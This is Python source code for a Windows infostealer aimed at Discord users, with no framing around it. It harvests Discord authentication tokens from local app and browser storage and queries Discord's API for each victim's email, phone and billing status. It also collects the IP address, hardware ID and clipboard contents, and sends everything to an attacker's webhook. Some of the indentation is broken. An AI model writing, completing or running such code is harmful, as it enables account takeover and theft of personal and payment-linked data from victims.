import os
import sys
import socket
import platform
import getpass
import win32clipboard
if os.name != "nt":
    sys.exit(0)
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen


hooker_link = '' # put webhook link here
hooker_name = 'shitass' # webhook name
hooker_av = 'https://i.kym-cdn.com/entries/icons/original/000/018/166/pakalu.png' #webhook avatar url
embeds = []


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"   
}


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers



def toucan():

    def getuserdata(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
        except:
            pass


    def gettokens(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens


    def has_payment_methods(token):
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
        except:
            pass
    

    def getavatar(uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]

        return url
 

    cache_path = ROAMING + "\\.cache~$"
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    global username
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
    working_ids.append(uid)
    working.append(token)
    username = user_data["username"] + "#" + str(user_data["discriminator"])
    user_id = user_data["id"]
    avatar_id = user_data["avatar"]
    avatar_url = getavatar(user_id, avatar_id)
    email = user_data.get("email")
    phone = user_data.get("phone")
    nitro = bool(user_data.get("premium_type"))
    billing = bool(has_payment_methods(token))
    token_embed = {
        "color": 0x7289da,
        "fields": [
            {
                "name": "**Account Info**",
                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}\nToken Location: {platform}',
                "inline": True
            },
            {
                "name": "**Token**",
                "value": token,
                "inline": False
            }
        ],
        "author": {
            "name": f"{username} ({user_id})",
            "icon_url": avatar_url
        },
    }
    embeds.append(token_embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')


def pcinfo():

    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip


    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        return hwid


    pub_ip = getip()
    hostname = socket.gethostname()
    int_ip = socket.gethostbyname(hostname)
    processor = platform.processor()
    os = platform.system() + " " + platform.version()
    machine = platform.machine()
    hwid = gethwid()
    pc_username = getpass.getuser()
    pc_embed = {
        "color": 0x7289da,
        "fields": [
        {
            "name": f"**PC Info For {username}**",
            "value": f'Public IP: {pub_ip}\nInternal IP: {int_ip}\nHostname: {hostname}\nPC Username: {pc_username}\nProcessor: {processor}\n OS: {os}\nMachine: {machine}\nHWID: {hwid}'
        }],
    }

    embeds.append(pc_embed)


def getclipboard():
    try:
        win32clipboard.OpenClipboard()
        fuckmyass = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        clipboard_embed = {
            "color": 0x7289da,
            "fields": [
            {
                "name": f"**Clipboard Data For {username}**",
                "value": f"{fuckmyass}"
            },
            ]
        }
    except:
        pass

    embeds.append(clipboard_embed)


def main():
    toucan()
    pcinfo()
    getclipboard()
    webhook = {
        "embeds": embeds,
        "username": hooker_name,
        "avatar_url": hooker_av
    }
    try:
        urlopen(Request(hooker_link, data=dumps(webhook).encode(), headers=getheaders()))
    except Exception as e:
        print(e)



if __name__ == "__main__":
    main()